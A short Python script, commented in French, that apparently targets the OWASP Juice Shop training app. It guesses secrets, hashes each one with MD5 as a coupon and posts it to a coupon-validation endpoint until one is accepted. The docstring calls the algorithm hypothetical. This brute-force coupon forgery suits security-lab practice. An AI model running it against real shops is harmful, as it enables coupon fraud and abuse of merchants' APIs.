import requests
import hashlib

def generate_coupon(base, secret):
    """Génère un coupon basé sur un algorithme hypothétique."""
    combined = f"{base}{secret}"
    coupon = hashlib.md5(combined.encode()).hexdigest()
    return coupon

def simulate_forged_coupon(base_url, base_string, secrets):
    """
    Tente de forger un coupon valide.
    Args:
        base_url (str): URL de l'API du Juice Shop.
        base_string (str): Chaîne de base du coupon.
        secrets (list): Liste de secrets possibles.
    """
    valid_coupon = None
    url = f"{base_url}/rest/coupon/validate"

    for secret in secrets:
        coupon = generate_coupon(base_string, secret)
        response = requests.post(url, json={"couponCode": coupon})
        
        if response.status_code == 200 and response.json().get("valid"):
            valid_coupon = coupon
            print(f"[SUCCESS] Valid coupon found: {coupon}")
            break
        else:
            print(f"[FAIL] Tried coupon: {coupon}")
    
    return valid_coupon
